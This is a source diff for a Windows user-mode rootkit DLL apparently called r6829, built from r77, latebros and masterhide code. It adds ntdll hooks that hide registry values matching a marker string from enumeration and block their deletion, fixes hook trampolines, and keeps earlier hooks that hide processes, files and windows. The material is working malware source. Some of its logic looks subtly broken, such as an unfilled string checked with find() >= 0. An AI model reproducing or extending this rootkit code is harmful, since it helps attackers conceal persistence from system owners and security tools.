@@ -1,8 +1,8 @@
 #include <wtypes.h>
 #include <winternl.h>
 #include <Psapi.h>
-#include "FileDirectoryInformationEx.h"
 #include "r77.h"
+#include <string_view>
 
 
 #define SYSCALL_INDEX( a )	( *( PULONG )( ( PUCHAR )a + 1 ) )
@@ -169,13 +169,27 @@ enum class FileInformationClassEx
 };
 // hooks from r77 converted to ntdll
 
-typedef NTSTATUS(WINAPI* NtQuerySystemInformation_)(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx* systemInformation, ULONG systemInformationLength, PULONG returnLength);
-typedef NTSTATUS(*NtQueryDirectoryFile_)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FileInformationClassEx FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
-
+typedef NTSTATUS(NTAPI* NtQuerySystemInformation_)(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx* systemInformation, ULONG systemInformationLength, PULONG returnLength);
+typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FileInformationClassEx FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
 NtQuerySystemInformation_ oNtQuerySystemInformation;
 NtQueryDirectoryFile_ oNtQueryDirectoryFile;
+
+// latebros registry hooks
+enum class KEY_VALUE_INFORMATION_CLASS {
+	KeyValueBasicInformation = 0,
+	KeyValueFullInformation,
+	KeyValuePartialInformation,
+	KeyValueFullInformationAlign64,
+	KeyValuePartialInformationAlign64,
+	MaxKeyValueInfoClass
+};
+typedef NTSTATUS(NTAPI* NtDeleteValueKey_)(HANDLE key_handle, PUNICODE_STRING value_name);
+typedef NTSTATUS(NTAPI* NtEnumerateValueKey_)(HANDLE key_handle, ULONG index, KEY_VALUE_INFORMATION_CLASS key_value_class, PVOID key_value_info, ULONG length, PULONG return_length);
+NtDeleteValueKey_ oNtDeleteValueKey;
+NtEnumerateValueKey_ oNtEnumerateValueKey;
+
 //
-// win32k.sys hooks
+// win32k.sys hooks from masterhide
 //
 
 typedef HWND(NTAPI* NtUserFindWindowEx_)(HWND hWndParent, HWND hWndChildAfter, PUNICODE_STRING lpszClass, PUNICODE_STRING lpszWindow, DWORD dwType);
@@ -255,6 +269,13 @@ void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileIn
 		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
 		break;
 	}
+}
+bool is_protected_entry(WCHAR *entry) {
+	bool bResult = false;
+	if (wcsstr(entry, _6829_STR)) {
+		bResult = true;
+	}
+	return bResult;
 }
 bool IsProtectedProcess(HANDLE PID)
 {
@@ -544,6 +565,113 @@ NTSTATUS NTAPI hkNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
 	return ret;
 }
 
+/*
+* Function: ntdll!NtDeleteValueKey
+* Purpose: Protect any r6829 registry value from being deleted - from latebros
+*
+*/
+NTSTATUS NTAPI hkNtDeleteValueKey(HANDLE key_handle, PUNICODE_STRING value_name)
+{
+	if (!value_name)
+		return STATUS_INVALID_PARAMETER;
+
+	if (!value_name->Buffer || is_protected_entry(value_name->Buffer))
+		return STATUS_OBJECT_NAME_NOT_FOUND;
+
+	// CALL	
+	auto result = oNtDeleteValueKey(key_handle, value_name);
+
+	return result;
+}
+
+/*
+* Function: ntdll!NtEnumerateValueKey
+* Purpose: hide any r6829 registry value from enumeration - from latebros
+*
+*/
+struct KEY_VALUE_BASIC_INFORMATION {
+	ULONG TitleIndex;
+	ULONG Type;
+	ULONG NameLength;
+	WCHAR Name[1];
+};
+struct KEY_VALUE_FULL_INFORMATION {
+	ULONG TitleIndex;
+	ULONG Type;
+	ULONG DataOffset;
+	ULONG DataLength;
+	ULONG NameLength;
+	WCHAR Name[1];
+};
+NTSTATUS NTAPI hkNtEnumerateValueKey(HANDLE key_handle, ULONG index, KEY_VALUE_INFORMATION_CLASS key_value_class, PVOID key_value_info, ULONG length, PULONG return_length)
+{
+
+	// WE NEED TO SAVE INDEXES NOT TO DISPLAY SAME KEY TWICE AFTER REPLACING THE HIDDEN ONES
+	// THESE ARE UNIQUE TO EACH THREAD TO PREVENT MULTI-THREAD ISSUES
+	thread_local int last_replaced = -1;
+	thread_local HANDLE last_handle = key_handle;
+
+	// WE ARE NOT ITERATING OVER A NEW KEYS LIST
+	if (last_handle != key_handle)
+	{
+		last_handle = key_handle;
+		last_replaced = -1;
+	}
+
+	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
+	if (static_cast<int>(index) <= last_replaced)
+	{
+		index = last_replaced + 1;
+		++last_replaced;
+	}
+
+	NTSTATUS result;
+	while (true)
+	{
+		// CALL	
+		result = oNtEnumerateValueKey(key_handle, index, key_value_class, key_value_info, length, return_length);
+
+		// SOMETHING FAILED OR WE REACHED THE END OF LIST
+		if (!NT_SUCCESS(result))
+		{
+			// RESET THE INDEX OF LAST REPLACED REGISTRY VALUE
+			last_replaced = -1;
+			break;
+		}
+
+		std::wstring sv;
+		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
+		{
+
+			if (is_protected_entry(static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info)->Name))
+				last_replaced = index;
+		}
+		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
+		{
+			if(is_protected_entry(static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info)->Name))
+				last_replaced = index;
+		}
+		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
+		{
+			break;
+		}
+
+		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP
+
+		if (sv.find(_6829_STR) >= 0)
+		{
+			// UPDATE THE INDEX OF LAST REPLACEMENT
+			break;
+		}
+
+		// ELSE CLEAR THE CURRENT HELD INFORMATION AND INCREASE THE INDEX TO CHECK NEXT VALUE
+		std::memset(key_value_info, 0x00, length);
+		++index;
+	}
+
+
+	return result;
+}
 void r6829_Initialize()
 {
 	CHAR Mutant[32];
@@ -555,16 +683,14 @@ void r6829_Initialize()
 		exit(1);
 	char szExePath[MAX_PATH + 1];
 	GetModuleFileNameA(nullptr, szExePath, MAX_PATH);
-	if (strstr(szExePath, "regedit.exe")) //anti regedit
-		exit(1);
-	if (strstr(szExePath, "mmc.exe")) //anti event viewer
-		exit(1);
 	MH_Initialize();
-	MH_CreateHookApi(L"ntdll.dll", "NtUserQueryWindow", &hkNtUserQueryWindow, reinterpret_cast<PVOID*>(&hkNtUserQueryWindow));
-	MH_CreateHookApi(L"ntdll.dll", "NtUserGetForegroundWindow", &hkNtUserGetForegroundWindow, reinterpret_cast<PVOID*>(&hkNtUserGetForegroundWindow));
+	MH_CreateHookApi(L"ntdll.dll", "NtUserQueryWindow", &hkNtUserQueryWindow, reinterpret_cast<PVOID*>(&oNtUserQueryWindow));
+	MH_CreateHookApi(L"ntdll.dll", "NtUserGetForegroundWindow", &hkNtUserGetForegroundWindow, reinterpret_cast<PVOID*>(&oNtUserGetForegroundWindow));
 	MH_CreateHookApi(L"ntdll.dll", "NtOpenProcess", &hkNtOpenProcess, reinterpret_cast<PVOID*>(&oNtOpenProcess));
 	MH_CreateHookApi(L"ntdll.dll", "NtQuerySystemInformation", &hkNtQuerySystemInformation, reinterpret_cast<PVOID*>(&oNtQuerySystemInformation));
-	MH_CreateHookApi(L"ntdll.dll", "NtQueryDirectoryFile", &hkNtQueryDirectoryFile, (LPVOID*)&oNtQueryDirectoryFile);
+	MH_CreateHookApi(L"ntdll.dll", "NtQueryDirectoryFile", &hkNtQueryDirectoryFile, reinterpret_cast<PVOID*>(&oNtQueryDirectoryFile));
+	MH_CreateHookApi(L"ntdll.dll", "NtEnumerateValueKey", &hkNtEnumerateValueKey, reinterpret_cast<PVOID*>(&oNtEnumerateValueKey));
+	MH_CreateHookApi(L"ntdll.dll", "NtDeleteValueKey", &hkNtDeleteValueKey, reinterpret_cast<PVOID*>(&oNtDeleteValueKey));
 	MH_EnableHook(MH_ALL_HOOKS);
 }
 bool __stdcall DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
